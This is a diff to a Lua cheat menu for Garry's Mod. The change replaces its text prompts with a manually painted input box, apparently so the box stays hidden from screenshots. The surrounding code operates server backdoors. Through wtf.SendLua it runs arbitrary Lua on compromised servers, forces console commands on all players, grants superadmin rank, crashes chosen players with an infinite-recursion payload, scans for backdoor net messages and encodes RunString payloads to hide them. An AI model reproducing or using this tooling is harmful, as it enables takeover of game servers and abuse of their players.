@@ -449,6 +449,84 @@ local function CreateCheckbox(name, tab, x, y, func)
     end
 end
 
+local function CreateInputBox(name, func)
+    local Frame = vgui.Create("DFrame")
+    Frame:MakePopup()
+    Frame:SetTitle("")
+    Frame:SetSize(220,95)
+    Frame:Center(); Frame:Show()
+    Frame:ShowCloseButton(false)
+    Frame:SetPaintedManually(true)
+    Frame.Paint = function(self,w,h)
+        draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
+        surface.SetDrawColor(25, 25, 25, 255)
+        surface.DrawOutlinedRect(0, 0, w, h)
+        draw.SimpleText(name, "DermaDefault", 11, 9, Color(255,255,255,200))
+    end
+
+    local InputHook = wtf.gString()
+    hook.Add("AltHUDPaint", InputHook, function()
+        Frame:PaintManual()
+    end)
+
+    local TextPanel = vgui.Create("DFrame", Frame)
+    TextPanel:ShowCloseButton(false)
+    TextPanel:SetDraggable(false)
+    TextPanel:SetTitle(" ")
+    TextPanel:SetSize(200, 40)
+    TextPanel:SetPos(10, 25)
+    TextPanel.Paint = function(self,w,h)
+        draw.RoundedBox(0,0,0,w,h,Color(31, 31, 31, 230))
+        surface.SetDrawColor(25, 25, 25, 255)
+        surface.DrawOutlinedRect(0, 0, w, h)
+    end
+
+    local TextEntry = vgui.Create("DTextEntry", TextPanel)
+    TextEntry:SetPos(5, 7.5)
+    TextEntry:AllowInput()
+    TextEntry:SetSize(190, 25)
+    TextEntry:SetValue("")
+    TextEntry.Paint = function(self, w, h)
+        draw.RoundedBox(0,0,0,w,h,Color(33, 33, 33, 200))
+        surface.SetDrawColor(25, 25, 25, 255)
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
+    end
+
+    local AcceptButton = vgui.Create("DButton", Frame)
+    AcceptButton:SetText("Accept")
+    AcceptButton:SetPos(128, 70)
+    AcceptButton:SetFont("DermaDefault")
+    AcceptButton:SetSize(80, 20)
+    AcceptButton.DoClick = function()
+        func(TextEntry:GetValue())
+        hook.Remove("AltHUDPaint", InputHook)
+        Frame:Close(); 
+    end
+    AcceptButton.Paint = function(self, w,h)
+        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
+        surface.SetDrawColor(40, 40, 40, 255)
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:SetTextColor(Color(255,255,255))
+    end
+
+    local CancelButton = vgui.Create("DButton", Frame)
+    CancelButton:SetText("Cancel")
+    CancelButton:SetPos(43, 70)
+    CancelButton:SetFont("DermaDefault")
+    CancelButton:SetSize(80, 20)
+    CancelButton.DoClick = function()
+        hook.Remove("AltHUDPaint", InputHook)
+        Frame:Close()
+    end
+    CancelButton.Paint = function(self, w,h)
+        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
+        surface.SetDrawColor(40, 40, 40, 255)
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:SetTextColor(Color(255,255,255))
+    end
+end
+
 local function CreateSlider(name, table, tab, max, min, x, y)
     local Frame=vgui.Create("DFrame", tab)
     Frame:SetSize(110,25)
@@ -1376,7 +1454,7 @@ CreateBDServer("Teleport All",  function()
 end)
 
 CreateBDServer("Speed All", function()
-    Derma_StringRequest("Set Speed All", "Set Everyones Speed To: ", "", function(str)
+    CreateInputBox("Set Speed All", function(str) 
         wtf.Log("Speed Set: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1397,7 +1475,7 @@ CreateBDServer("Dance All",  function()
 end)
 
 CreateBDServer("Force Say All", function()
-    Derma_StringRequest("Force Everyone To Chat", "Message To Chat:", "",function(str)
+    CreateInputBox("Force Say", function(str)
         wtf.Log("Everyone Just Said: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1413,14 +1491,14 @@ CreateBDServer("Encony fucker", function()
 end)
 
 CreateBDServer("Console Say", function()
-    Derma_StringRequest("Console Say", "Make Console Say In Chat: ", "", function(str)
+    CreateInputBox("Console Say", function(str)
         wtf.Log("Console Said: "..str)
         wtf.SendLua([[RunConsoleCommand("say",']]..str..[[')]])
     end)
 end)
 
 CreateBDServer("Size All", function()
-    Derma_StringRequest("Size Everyone", "Set The Size Of Everyone To:", "", function(str)
+    CreateInputBox("Size Everyone", function(str)
         wtf.Log("Everyones Size: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1431,7 +1509,7 @@ CreateBDServer("Size All", function()
 end)
 
 CreateBDServer("ConCommand All", function()
-    Derma_StringRequest("ConCommand All", "Text To Run(eg: retry):", "", function(str)
+    CreateInputBox("ConCommand All", function(str)
         wtf.Log("Ran Command: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1442,7 +1520,7 @@ CreateBDServer("ConCommand All", function()
 end)
 
 CreateBDServer("JumpPower All", function()
-    Derma_StringRequest("JumpPower All", "JumpPower To Set All:", "", function(str)
+    CreateInputBox("JumpPower All", function(str)
         wtf.Log("Everyones JumpPower: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1508,7 +1586,7 @@ CreateBDServer("UnBlind All", function()
 end)
 
 CreateBDServer("Health All", function()
-    Derma_StringRequest("Health All", "Health To Set To:", "", function(str)
+    CreateInputBox("Health All", function(str)
         wtf.Log("Everyones Health Set: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1519,7 +1597,7 @@ CreateBDServer("Health All", function()
 end)
 
 CreateBDServer("Armor All", function()
-    Derma_StringRequest("Armor All", "Armor To Set To:", "", function(str)
+    CreateInputBox("Armor All", function(str)
         wtf.Log("Everyones Armor Set: "..str)
         wtf.SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1547,7 +1625,7 @@ CreateBDClient("Fling", function()
 end)
 
 CreateBDClient("Set Speed",  function()
-    Derma_StringRequest("Set Speed", "Speed To Set The Player:", "", function(str)
+    CreateInputBox("Set Speed", function(str)
         wtf.Log(Player(SelectedPlr):Nick().." Speed Set")
         wtf.SendLua([[
             local me = Player(]]..SelectedPlr..[[)
@@ -1558,7 +1636,7 @@ CreateBDClient("Set Speed",  function()
 end)
 
 CreateBDClient("Give Item",  function()
-    Derma_StringRequest("Give Item", "Give Item Named:", "", function(str)
+    CreateInputBox("Give Item", function(str)
         wtf.Log("Item Given To: "..Player(SelectedPlr):Nick())
         wtf.SendLua([[
             local me = Player(]]..SelectedPlr..[[)
@@ -1568,19 +1646,17 @@ CreateBDClient("Give Item",  function()
 end)
 
 CreateBDClient("Crash Player",  function()
-    wtf.SendLua([[
-        Player(]]..SelectedPlr..[[):SendLua("function die() return die() end die()")
-    ]])
     wtf.Log("Player: "..Player(SelectedPlr):Nick().." Crashed")
+    wtf.SendLua([[Player(]]..SelectedPlr..[[):SendLua("function die() return die() end die()")]])
 end)
 
 CreateBDClient("Force Say",  function()
-    Derma_StringRequest("Force Say", "Force Player To Say:", "", function(str)
+    CreateInputBox("Force Say", function(str)
+        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
         wtf.SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:Say("]]..str..[[")
         ]])
-        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
     end)
 end)
 
@@ -1602,7 +1678,7 @@ CreateBDClient("NoClip Player",  function()
 end)
 
 CreateBDClient("Set Usergroup",  function()
-    Derma_StringRequest("Set Usergroup", "ex: superadmin", "", function(str)
+    CreateInputBox("Set Usergroup", function(str)
         wtf.Log("Player: "..Player(SelectedPlr):Nick().." Usergroup: "..str)
         wtf.SendLua([[
             local me = Player(]]..SelectedPlr..[[)
@@ -1670,7 +1746,7 @@ CreateBDClient("Dance Player",  function()
 end)
 
 CreateBDClient("Size Player",  function()
-    Derma_StringRequest("Set Size", "Players Size:", "", function(str)
+    CreateInputBox("Set Size", function(str)
         wtf.Log("Player: "..Player(SelectedPlr):Nick().." Size:"..str)
         wtf.SendLua([[
             local me = Player(]]..SelectedPlr..[[)
@@ -1680,7 +1756,7 @@ CreateBDClient("Size Player",  function()
 end)
 
 CreateBDClient("ConCommand Player",  function()
-    Derma_StringRequest("ConCommand", "String To Run In Console:", "", function(str)
+    CreateInputBox("ConCommand", function(str)
         wtf.Log("Ran Command: "..str.." Player: "..Player(SelectedPlr):Nick())
         wtf.SendLua([[
             local me = Player(]]..SelectedPlr..[[)
@@ -1731,7 +1807,7 @@ CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
 end)
 
 CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
-    Derma_StringRequest("Select Net", "Net To Select:", "", function(str)
+    CreateInputBox("Select Net", function(str)
         if wtf.CheckNet(str) then
             SelectedNet=str
             wtf.Log("Selected Net "..str)
@@ -1744,7 +1820,7 @@ CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
 end)
 
 CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
-    Derma_StringRequest("Add Net | Staff Use Only", "Net To Add:", "", function(str)
+    CreateInputBox("Add Net | Staff Use Only", function(str)
         wtf.AddNet(str)
     end)
 end)
@@ -1833,14 +1909,14 @@ CreateCheckbox("Flash-Spammer", MiscTab[1], 142, 40, function()
 end)
 
 CreateButton("FOV-Editor", MiscTab[1], 110, 25, 262, 40, function()
-    Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
+    CreateInputBox("Edit Fov", function(str)
         LocalPlayer():ConCommand("fov_desired "..str)
         wtf.Log("FOV Set: "..str)
     end)
 end)
 
 CreateButton("Encode-String", MiscTab[1], 110, 25, 382, 40, function()
-    Derma_StringRequest("Encode String", "String To Encode", "", function(str)
+    CreateInputBox("Encode String", function(str)
         local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
         wtf.conoutRGB("ENCODED-STRING: ".."RunString('"..encoded.."')")
         SetClipboardText("RunString('"..encoded.."')")
@@ -1887,7 +1963,7 @@ CreateCheckbox("Auto Fire", MiscTab[1], 22, 100, function()
 end)
 
 CreateButton("Play URL-Link", SoundsTab[1], 120, 35, 385, 520, function()
-    Derma_StringRequest("Play URL", "URL:", "", function(str)
+    CreateInputBox("Play URL", function(str)
         wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
         wtf.Log("Playing: " .. str)
     end)
